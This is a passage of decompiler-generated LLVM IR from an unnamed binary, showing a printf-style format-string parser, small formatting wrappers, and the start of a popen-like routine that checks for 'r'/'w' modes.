dec_label_pc_1000111c:                            ; preds = %dec_label_pc_10001134.preheader, %dec_label_pc_1000111c
  %v4_1000113410 = phi i32 [ %v1_10001120, %dec_label_pc_1000111c ], [ %v4_100011343, %dec_label_pc_10001134.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_1000112c, %dec_label_pc_1000111c ], [ %stack_var_-52.0.ph, %dec_label_pc_10001134.preheader ]
  %v1_10001120 = add i32 %v4_1000113410, 1
  %v5_10001124 = inttoptr i32 %v1_10001120 to i8*
  %v1_1000112c = or i32 %stack_var_-52.09, 2
  %v2_10001138 = load i8, i8* %v5_10001124, align 1
  %v3_10001140 = icmp eq i8 %v2_10001138, 48
  br i1 %v3_10001140, label %dec_label_pc_1000111c, label %dec_label_pc_10001180.preheader

dec_label_pc_10001180.preheader:                  ; preds = %dec_label_pc_1000111c, %dec_label_pc_10001134.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10001134.preheader ], [ %v1_1000112c, %dec_label_pc_1000111c ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10001134.preheader ], [ %v5_10001124, %dec_label_pc_1000111c ]
  %v4_1000118012 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_1000118413 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_1000118413, 48
  br i1 %tmp62, label %dec_label_pc_100011a8, label %dec_label_pc_10001194

dec_label_pc_1000114c:                            ; preds = %dec_label_pc_10001194
  %v1_10001150 = mul i32 %stack_var_-48.018, 10
  %v2_1000115c = load i8, i8* %stack_var_-68.119, align 1
  %v3_1000115c = zext i8 %v2_1000115c to i32
  %v2_10001168 = add i32 %v1_10001150, -48
  %v1_1000116c = add i32 %v2_10001168, %v3_1000115c
  %v1_10001178 = add i32 %v4_1000118020, 1
  %v5_1000117c = inttoptr i32 %v1_10001178 to i8*
  %v2_10001184 = load i8, i8* %v5_1000117c, align 1
  %tmp63 = icmp ult i8 %v2_10001184, 48
  br i1 %tmp63, label %dec_label_pc_100011a8, label %dec_label_pc_10001194

dec_label_pc_10001194:                            ; preds = %dec_label_pc_10001180.preheader, %dec_label_pc_1000114c
  %v4_1000118020 = phi i32 [ %v1_10001178, %dec_label_pc_1000114c ], [ %v4_1000118012, %dec_label_pc_10001180.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_1000117c, %dec_label_pc_1000114c ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10001180.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_1000116c, %dec_label_pc_1000114c ], [ 0, %dec_label_pc_10001180.preheader ]
  %v2_10001198 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10001198, 58
  br i1 %tmp64, label %dec_label_pc_1000114c, label %dec_label_pc_100011a8

dec_label_pc_100011a8:                            ; preds = %dec_label_pc_1000114c, %dec_label_pc_10001194, %dec_label_pc_10001180.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10001180.preheader ], [ %v1_1000116c, %dec_label_pc_1000114c ], [ %stack_var_-48.018, %dec_label_pc_10001194 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10001180.preheader ], [ %v5_1000117c, %dec_label_pc_1000114c ], [ %stack_var_-68.119, %dec_label_pc_10001194 ]
  %v2_100011ac = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_100011b4 = icmp eq i8 %v2_100011ac, 115
  br i1 %v3_100011b4, label %dec_label_pc_100011bc, label %dec_label_pc_1000127c

dec_label_pc_100011bc:                            ; preds = %dec_label_pc_100011a8
  %v2_100011c0 = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_100011c0, 7
  br i1 %tmp65, label %dec_label_pc_10001208, label %dec_label_pc_100011d0

dec_label_pc_100011d0:                            ; preds = %dec_label_pc_100011bc
  %v3_100011d4 = load i32, i32* %v2_100011d4, align 4
  %v2_100011dc = load i8, i8* %tmp, align 1
  %v3_100011dc = zext i8 %v2_100011dc to i32
  %v1_100011e8 = mul nuw nsw i32 %v3_100011dc, 4
  %v2_100011ec = add i32 %v1_100011e8, %v3_100011d4
  %v1_100011f4 = add i8 %v2_100011dc, 1
  store i8 %v1_100011f4, i8* %tmp, align 1
  br label %dec_label_pc_10001220

dec_label_pc_10001208:                            ; preds = %dec_label_pc_100011bc
  %v3_1000120c = load i32, i32* %v2_1000120c, align 4
  %v1_10001214 = add i32 %v3_1000120c, 4
  store i32 %v1_10001214, i32* %v2_1000120c, align 4
  br label %dec_label_pc_10001220

dec_label_pc_10001220:                            ; preds = %dec_label_pc_100011d0, %dec_label_pc_10001208
  %stack_var_-20.0 = phi i32 [ %v3_1000120c, %dec_label_pc_10001208 ], [ %v2_100011ec, %dec_label_pc_100011d0 ]
  %v1_10001224 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10001224 = load i32, i32* %v1_10001224, align 4
  %v3_10001230 = icmp eq i32 %v2_10001224, 0
  br i1 %v3_10001230, label %dec_label_pc_10001244, label %dec_label_pc_10001238

dec_label_pc_10001238:                            ; preds = %dec_label_pc_10001220
  %v5_1000123c = inttoptr i32 %v2_10001224 to i8*
  br label %dec_label_pc_10001250

dec_label_pc_10001244:                            ; preds = %dec_label_pc_10001220
  br label %dec_label_pc_10001250

dec_label_pc_10001250:                            ; preds = %dec_label_pc_10001238, %dec_label_pc_10001244
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017708.26, i32 0, i32 0), %dec_label_pc_10001244 ], [ %v5_1000123c, %dec_label_pc_10001238 ]
  %v6_10001264 = call i32 @function_10000cc8(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10001270 = add i32 %v6_10001264, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_1000127c:                            ; preds = %dec_label_pc_100011a8
  %v2_10001280 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10001288 = icmp eq i8 %v2_10001280, 100
  br i1 %v3_10001288, label %dec_label_pc_10001290, label %dec_label_pc_10001330

dec_label_pc_10001290:                            ; preds = %dec_label_pc_1000127c
  %v2_10001294 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10001294, 7
  br i1 %tmp66, label %dec_label_pc_100012dc, label %dec_label_pc_100012a4

dec_label_pc_100012a4:                            ; preds = %dec_label_pc_10001290
  %v3_100012a8 = load i32, i32* %v2_100011d4, align 4
  %v2_100012b0 = load i8, i8* %tmp, align 1
  %v3_100012b0 = zext i8 %v2_100012b0 to i32
  %v1_100012bc = mul nuw nsw i32 %v3_100012b0, 4
  %v2_100012c0 = add i32 %v1_100012bc, %v3_100012a8
  %v1_100012c8 = add i8 %v2_100012b0, 1
  store i8 %v1_100012c8, i8* %tmp, align 1
  br label %dec_label_pc_100012f4

dec_label_pc_100012dc:                            ; preds = %dec_label_pc_10001290
  %v3_100012e0 = load i32, i32* %v2_1000120c, align 4
  %v1_100012e8 = add i32 %v3_100012e0, 4
  store i32 %v1_100012e8, i32* %v2_1000120c, align 4
  br label %dec_label_pc_100012f4

dec_label_pc_100012f4:                            ; preds = %dec_label_pc_100012a4, %dec_label_pc_100012dc
  %stack_var_-28.0 = phi i32 [ %v3_100012e0, %dec_label_pc_100012dc ], [ %v2_100012c0, %dec_label_pc_100012a4 ]
  %v1_100012f8 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_100012f8 = load i32, i32* %v1_100012f8, align 4
  %v7_10001318 = call i32 @function_10000e6c(i32 %tmp41, i32 %v2_100012f8, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10001324 = add i32 %v7_10001318, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_10001330:                            ; preds = %dec_label_pc_1000127c
  %v2_10001334 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000133c = icmp eq i8 %v2_10001334, 120
  br i1 %v3_1000133c, label %dec_label_pc_10001344, label %dec_label_pc_100013e4

dec_label_pc_10001344:                            ; preds = %dec_label_pc_10001330
  %v2_10001348 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10001348, 7
  br i1 %tmp67, label %dec_label_pc_10001390, label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001344
  %v3_1000135c = load i32, i32* %v2_100011d4, align 4
  %v2_10001364 = load i8, i8* %tmp, align 1
  %v3_10001364 = zext i8 %v2_10001364 to i32
  %v1_10001370 = mul nuw nsw i32 %v3_10001364, 4
  %v2_10001374 = add i32 %v1_10001370, %v3_1000135c
  %v1_1000137c = add i8 %v2_10001364, 1
  store i8 %v1_1000137c, i8* %tmp, align 1
  br label %dec_label_pc_100013a8

dec_label_pc_10001390:                            ; preds = %dec_label_pc_10001344
  %v3_10001394 = load i32, i32* %v2_1000120c, align 4
  %v1_1000139c = add i32 %v3_10001394, 4
  store i32 %v1_1000139c, i32* %v2_1000120c, align 4
  br label %dec_label_pc_100013a8

dec_label_pc_100013a8:                            ; preds = %dec_label_pc_10001358, %dec_label_pc_10001390
  %stack_var_-32.0 = phi i32 [ %v3_10001394, %dec_label_pc_10001390 ], [ %v2_10001374, %dec_label_pc_10001358 ]
  %v1_100013ac = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_100013ac = load i32, i32* %v1_100013ac, align 4
  %v7_100013cc = call i32 @function_10000e6c(i32 %tmp41, i32 %v2_100013ac, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_100013d8 = add i32 %v7_100013cc, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_100013e4:                            ; preds = %dec_label_pc_10001330
  %v2_100013e8 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_100013f0 = icmp eq i8 %v2_100013e8, 88
  br i1 %v3_100013f0, label %dec_label_pc_100013f8, label %dec_label_pc_10001498

dec_label_pc_100013f8:                            ; preds = %dec_label_pc_100013e4
  %v2_100013fc = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_100013fc, 7
  br i1 %tmp68, label %dec_label_pc_10001444, label %dec_label_pc_1000140c

dec_label_pc_1000140c:                            ; preds = %dec_label_pc_100013f8
  %v3_10001410 = load i32, i32* %v2_100011d4, align 4
  %v2_10001418 = load i8, i8* %tmp, align 1
  %v3_10001418 = zext i8 %v2_10001418 to i32
  %v1_10001424 = mul nuw nsw i32 %v3_10001418, 4
  %v2_10001428 = add i32 %v1_10001424, %v3_10001410
  %v1_10001430 = add i8 %v2_10001418, 1
  store i8 %v1_10001430, i8* %tmp, align 1
  br label %dec_label_pc_1000145c

dec_label_pc_10001444:                            ; preds = %dec_label_pc_100013f8
  %v3_10001448 = load i32, i32* %v2_1000120c, align 4
  %v1_10001450 = add i32 %v3_10001448, 4
  store i32 %v1_10001450, i32* %v2_1000120c, align 4
  br label %dec_label_pc_1000145c

dec_label_pc_1000145c:                            ; preds = %dec_label_pc_1000140c, %dec_label_pc_10001444
  %stack_var_-36.0 = phi i32 [ %v3_10001448, %dec_label_pc_10001444 ], [ %v2_10001428, %dec_label_pc_1000140c ]
  %v1_10001460 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10001460 = load i32, i32* %v1_10001460, align 4
  %v7_10001480 = call i32 @function_10000e6c(i32 %tmp41, i32 %v2_10001460, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_1000148c = add i32 %v7_10001480, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_10001498:                            ; preds = %dec_label_pc_100013e4
  %v2_1000149c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_100014a4 = icmp eq i8 %v2_1000149c, 117
  br i1 %v3_100014a4, label %dec_label_pc_100014ac, label %dec_label_pc_1000154c

dec_label_pc_100014ac:                            ; preds = %dec_label_pc_10001498
  %v2_100014b0 = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_100014b0, 7
  br i1 %tmp69, label %dec_label_pc_100014f8, label %dec_label_pc_100014c0

dec_label_pc_100014c0:                            ; preds = %dec_label_pc_100014ac
  %v3_100014c4 = load i32, i32* %v2_100011d4, align 4
  %v2_100014cc = load i8, i8* %tmp, align 1
  %v3_100014cc = zext i8 %v2_100014cc to i32
  %v1_100014d8 = mul nuw nsw i32 %v3_100014cc, 4
  %v2_100014dc = add i32 %v1_100014d8, %v3_100014c4
  %v1_100014e4 = add i8 %v2_100014cc, 1
  store i8 %v1_100014e4, i8* %tmp, align 1
  br label %dec_label_pc_10001510

dec_label_pc_100014f8:                            ; preds = %dec_label_pc_100014ac
  %v3_100014fc = load i32, i32* %v2_1000120c, align 4
  %v1_10001504 = add i32 %v3_100014fc, 4
  store i32 %v1_10001504, i32* %v2_1000120c, align 4
  br label %dec_label_pc_10001510

dec_label_pc_10001510:                            ; preds = %dec_label_pc_100014c0, %dec_label_pc_100014f8
  %stack_var_-40.0 = phi i32 [ %v3_100014fc, %dec_label_pc_100014f8 ], [ %v2_100014dc, %dec_label_pc_100014c0 ]
  %v1_10001514 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10001514 = load i32, i32* %v1_10001514, align 4
  %v7_10001534 = call i32 @function_10000e6c(i32 %tmp41, i32 %v2_10001514, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10001540 = add i32 %v7_10001534, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_1000154c:                            ; preds = %dec_label_pc_10001498
  %v2_10001550 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10001558 = icmp eq i8 %v2_10001550, 99
  br i1 %v3_10001558, label %dec_label_pc_10001560, label %dec_label_pc_1000162c

dec_label_pc_10001560:                            ; preds = %dec_label_pc_1000154c
  %v2_10001564 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10001564, 7
  br i1 %tmp70, label %dec_label_pc_100015ac, label %dec_label_pc_10001574

dec_label_pc_10001574:                            ; preds = %dec_label_pc_10001560
  %v3_10001578 = load i32, i32* %v2_100011d4, align 4
  %v2_10001580 = load i8, i8* %tmp, align 1
  %v3_10001580 = zext i8 %v2_10001580 to i32
  %v1_1000158c = mul nuw nsw i32 %v3_10001580, 4
  %v2_10001590 = add i32 %v1_1000158c, %v3_10001578
  %v1_10001598 = add i8 %v2_10001580, 1
  store i8 %v1_10001598, i8* %tmp, align 1
  br label %dec_label_pc_100015c4

dec_label_pc_100015ac:                            ; preds = %dec_label_pc_10001560
  %v3_100015b0 = load i32, i32* %v2_1000120c, align 4
  %v1_100015b8 = add i32 %v3_100015b0, 4
  store i32 %v1_100015b8, i32* %v2_1000120c, align 4
  br label %dec_label_pc_100015c4

dec_label_pc_100015c4:                            ; preds = %dec_label_pc_10001574, %dec_label_pc_100015ac
  %stack_var_-44.0 = phi i32 [ %v3_100015b0, %dec_label_pc_100015ac ], [ %v2_10001590, %dec_label_pc_10001574 ]
  %v1_100015c8 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_100015c8 = load i32, i32* %v1_100015c8, align 4
  %v1_100015cc = urem i32 %v2_100015c8, 256
  store i32 %v1_100015cc, i32* %stack_var_-88, align 4
  %v5_100015f0 = call i32 @function_10000cc8(i32 %tmp41, i8* %v4_100015f0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_100015fc = add i32 %v5_100015f0, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_10001608:                            ; preds = %dec_label_pc_10001098, %dec_label_pc_100010dc
  %stack_var_-68.2 = phi i8* [ %v5_100010b4, %dec_label_pc_100010dc ], [ %stack_var_-68.434, %dec_label_pc_10001098 ]
  %v2_1000160c = load i8, i8* %stack_var_-68.2, align 1
  %v3_1000160c = zext i8 %v2_1000160c to i32
  %v3_1000161c = call i32 @function_10000c48(i32* %arg1, i32 %v3_1000160c)
  %v1_10001624 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_1000162c

dec_label_pc_1000162c:                            ; preds = %dec_label_pc_1000154c, %dec_label_pc_100015c4, %dec_label_pc_10001510, %dec_label_pc_1000145c, %dec_label_pc_100013a8, %dec_label_pc_100012f4, %dec_label_pc_10001250, %dec_label_pc_10001608
  %stack_var_-56.0 = phi i32 [ %v1_10001624, %dec_label_pc_10001608 ], [ %v2_10001270, %dec_label_pc_10001250 ], [ %v2_10001324, %dec_label_pc_100012f4 ], [ %v2_100013d8, %dec_label_pc_100013a8 ], [ %v2_1000148c, %dec_label_pc_1000145c ], [ %v2_10001540, %dec_label_pc_10001510 ], [ %v2_100015fc, %dec_label_pc_100015c4 ], [ %stack_var_-56.132, %dec_label_pc_1000154c ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10001608 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10001250 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_100012f4 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_100013a8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000145c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10001510 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_100015c4 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000154c ]
  %v4_1000162c = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10001630 = add i32 %v4_1000162c, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10001630 to i8*
  %v2_1000163c = load i8, i8* %stack_var_-68.4, align 1
  %v3_10001644 = icmp eq i8 %v2_1000163c, 0
  br i1 %v3_10001644, label %dec_label_pc_1000164c, label %dec_label_pc_10001098

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_100010ac, %dec_label_pc_1000162c, %dec_label_pc_1000106c
  %stack_var_-56.1.lcssa = phi i32 [ 0, %dec_label_pc_1000106c ], [ %stack_var_-56.132, %dec_label_pc_100010ac ], [ %stack_var_-56.0, %dec_label_pc_1000162c ]
  %v3_10001650 = icmp eq i32* %arg1, null
  br i1 %v3_10001650, label %dec_label_pc_10001668, label %dec_label_pc_10001658

dec_label_pc_10001658:                            ; preds = %dec_label_pc_1000164c
  %v2_1000165c = load i32, i32* %arg1, align 4
  %v3_10001664 = inttoptr i32 %v2_1000165c to i8*
  store i8 0, i8* %v3_10001664, align 1
  br label %dec_label_pc_10001668

dec_label_pc_10001668:                            ; preds = %dec_label_pc_1000164c, %dec_label_pc_10001658
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10001120, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_100010b4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_1000120c, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_10000e6c, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10001668, { 1, 0 }
  uselistorder label %dec_label_pc_1000164c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000162c, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10001608, { 1, 0 }
  uselistorder label %dec_label_pc_100015c4, { 1, 0 }
  uselistorder label %dec_label_pc_10001510, { 1, 0 }
  uselistorder label %dec_label_pc_1000145c, { 1, 0 }
  uselistorder label %dec_label_pc_100013a8, { 1, 0 }
  uselistorder label %dec_label_pc_100012f4, { 1, 0 }
  uselistorder label %dec_label_pc_10001250, { 1, 0 }
  uselistorder label %dec_label_pc_10001220, { 1, 0 }
  uselistorder label %dec_label_pc_100011a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001194, { 1, 0 }
  uselistorder label %dec_label_pc_1000111c, { 1, 0 }
  uselistorder label %dec_label_pc_10001098, { 1, 0 }
}

define i32 @function_10001688(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_10001688:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001708 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268441364, i32* @lr, align 4
  %v4_10001710 = call i32 @function_1000106c(i32* null, i32 %arg1, i32 %v2_10001708)
  ret i32 %v4_10001710

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @function_10001734(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001734:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_100017b8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268441540, i32* @lr, align 4
  %v4_100017c0 = call i32 @function_1000106c(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_100017b8)
  ret i32 %v4_100017c0

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @function_100017e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100017e4:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 268441668, i32* @lr, align 4
  %v1_10001840 = call i32 @function_1000ef60(i32 2048)
  store i32 %v1_10001840, i32* %stack_var_-144, align 4
  store i32 268441700, i32* @lr, align 4
  %v3_10001860 = call i32 @function_1000dd4c(i32 %v1_10001840, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_10001894 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268441768, i32* @lr, align 4
  %v4_100018a4 = call i32 @function_1000106c(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_10001894)
  store i32 %v1_10001840, i32* @r3, align 4
  %v0_100018ac = call i32 @function_1000df60()
  %v2_100018bc = add i32 %v0_100018ac, %v1_10001840
  %v3_100018c4 = inttoptr i32 %v2_100018bc to i8*
  store i8 10, i8* %v3_100018c4, align 1
  store i32 %v1_10001840, i32* @r3, align 4
  %v0_100018cc = call i32 @function_1000df60()
  store i32 268441832, i32* @lr, align 4
  %v4_100018e4 = call i32 @function_1000eca8(i32 %arg1, i32 %v1_10001840, i32 %v0_100018cc, i32 16384)
  store i32 268441848, i32* @lr, align 4
  %v1_100018f4 = call i32 @function_1000f0b8(i32 %v1_10001840)
  ret i32 %v4_100018e4

; uselistorder directives
  uselistorder i32 %v1_10001840, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
}

define i32 @function_10001918(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_10001918:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_10001938 = load i8, i8* %arg2, align 1
  %v3_10001940 = icmp eq i8 %v2_10001938, 114
  br i1 %v3_10001940, label %dec_label_pc_1000195c, label %dec_label_pc_10001948

dec_label_pc_10001948:                            ; preds = %dec_label_pc_10001918
  %v2_1000194c = load i8, i8* %arg2, align 1
  %v3_10001954 = icmp eq i8 %v2_1000194c, 119
  br i1 %v3_10001954, label %dec_label_pc_1000195c, label %dec_label_pc_10001974

dec_label_pc_1000195c:                            ; preds = %dec_label_pc_10001948, %dec_label_pc_10001918
  %v1_10001960 = add i32 %tmp, 1
  %v2_10001960 = inttoptr i32 %v1_10001960 to i8*
  %v3_10001964 = load i8, i8* %v2_10001960, align 1
  %v3_1000196c = icmp eq i8 %v3_10001964, 0
  br i1 %v3_1000196c, label %dec_label_pc_10001980, label %dec_label_pc_10001974

dec_label_pc_10001974:                            ; preds = %dec_label_pc_10001948, %dec_label_pc_1000195c
  br label %dec_label_pc_10001ba4

dec_label_pc_10001980:                            ; preds = %dec_label_pc_1000195c
  %v2_10001980 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268441996, i32* @lr, align 4
  %v3_10001988 = call i32 @function_1000c5ac(i32 %v2_10001980, i32 %v1_10001960)
  store i32 %v3_10001988, i32* @r3, align 4
  %tmp15 = icmp sgt i32 %v3_10001988, -1
  br i1 %tmp15, label %dec_label_pc_100019a4, label %dec_label_pc_10001998

dec_label_pc_10001998:                            ; preds = %dec_label_pc_10001980
  br label %dec_label_pc_10001ba4

dec_label_pc_100019a4:                            ; preds = %dec_label_pc_10001980
  %v3_100019a8 = load i32, i32* @global_var_1002b918.27, align 4
  %v3_100019ac = icmp eq i32 %v3_100019a8, 0
  br i1 %v3_100019ac, label %dec_label_pc_100019b4, label %dec_label_pc_10001a34

dec_label_pc_100019b4:                            ; preds = %dec_label_pc_100019a4
  store i32 268442040, i32* @lr, align 4
  %v1_100019b4 = call i32 @function_1000c3cc(i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v2_100019c4 = icmp sgt i32 %v1_100019b4, 0
  br i1 %v2_100019c4, label %dec_label_pc_100019d8, label %dec_label_pc_100019cc

dec_label_pc_100019cc:                            ; preds = %dec_label_pc_100019b4
  br label %dec_label_pc_10001ba4

dec_label_pc_100019d8:                            ; preds = %dec_label_pc_100019b4
  %v1_100019dc = mul i32 %v1_100019b4, 4
  store i32 268442088, i32* @lr, align 4
  %v1_100019e4 = call i32 @function_1000ef60(i32 %v1_100019dc)
  store i32 %v1_100019e4, i32* @global_var_1002b918.27, align 4
  %v3_100019fc = icmp eq i32 %v1_100019e4, 0
  br i1 %v3_100019fc, label %dec_label_pc_10001a04, label %dec_label_pc_10001a10

dec_label_pc_10001a04:                            ; preds = %dec_label_pc_100019d8
  br label %dec_label_pc_10001ba4

dec_label_pc_10001a10:                            ; preds = %dec_label_pc_100019d8
  store i32 ptrtoint (i32* @global_var_10001a34.28 to i32), i32* @lr, align 4
  %v3_10001a30 = call i32 @function_1000dd4c(i32 %v1_100019e4, i32 0, i32 %v1_100019dc)
  store i32 %v3_10001a30, i32* @r3, align 4
  br label %dec_label_pc_10001a34

dec_label_pc_10001a34:                            ; preds = %dec_label_pc_100019a4, %dec_label_pc_10001a10
  store i32 268442168, i32* @lr, align 4
  %v0_10001a34 = call i32 @function_1000c130()
  %v4_10001a50 = icmp eq i32 %v0_10001a34, -1
  br i1 %v4_10001a50, label %dec_label_pc_10001a68, label %dec_label_pc_10001a58

dec_label_pc_10001a58:                            ; preds = %dec_label_pc_10001a34
  %v3_10001a5c = icmp eq i32 %v0_10001a34, 0
  br i1 %v3_10001a5c, label %dec_label_pc_10001a8c, label %dec_label_pc_10001b3c

dec_label_pc_10001a68:                            ; preds = %dec_label_pc_10001a34
  %v3_10001a68 = load i32, i32* %stack_var_-48, align 4
  store i32 268442228, i32* @lr, align 4
  %v1_10001a70 = call i32 @function_1000c2f4(i32 %v3_10001a68)
  store i32 ptrtoint (i32* @global_var_10001a80.29 to i32), i32* @lr, align 4
  %v1_10001a7c = call i32 @function_1000c2f4(i32 %tmp3)
  br label %dec_label_pc_10001ba4

dec_label_pc_10001a8c:                            ; preds = %dec_label_pc_10001a58
  %v3_10001a90 = load i8, i8* %arg2, align 1
  %v3_10001a98 = icmp eq i8 %v3_10001a90, 114
  br i1 %v3_10001a98, label %dec_label_pc_10001aa0, label %dec_label_pc_10001ad8

dec_label_pc_10001aa0:                            ; preds = %dec_label_pc_10001a8c
  %v3_10001aa4 = icmp eq i32 %tmp3, 1
  br i1 %v3_10001aa4, label %dec_label_pc_10001ac8, label %dec_label_pc_10001aac

dec_label_pc_10001aac:                            ; preds = %dec_label_pc_10001aa0
  store i32 268442300, i32* @lr, align 4
  %v4_10001ab8 = call i32 @function_1000c33c(i32 %tmp3, i32 1, i32 %tmp)
  store i32 268442312, i32* @lr, align 4
  %v1_10001ac4 = call i32 @function_1000c2f4(i32 %tmp3)
  br label %dec_label_pc_10001ac8

dec_label_pc_10001ac8:                            ; preds = %dec_label_pc_10001aa0, %dec_label_pc_10001aac
  %v3_10001ac8 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_10001ad4.30 to i32), i32* @lr, align 4
  %v1_10001ad0 = call i32 @function_1000c2f4(i32 %v3_10001ac8)
  br label %dec_label_pc_10001b0c

dec_label_pc_10001ad8:                            ; preds = %dec_label_pc_10001a8c
  %v3_10001ad8 = load i32, i32* %stack_var_-48, align 4
  %v3_10001adc = icmp eq i32 %v3_10001ad8, 0
  br i1 %v3_10001adc, label %dec_label_pc_10001b00, label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %dec_label_pc_10001ad8
  store i32 268442356, i32* @lr, align 4
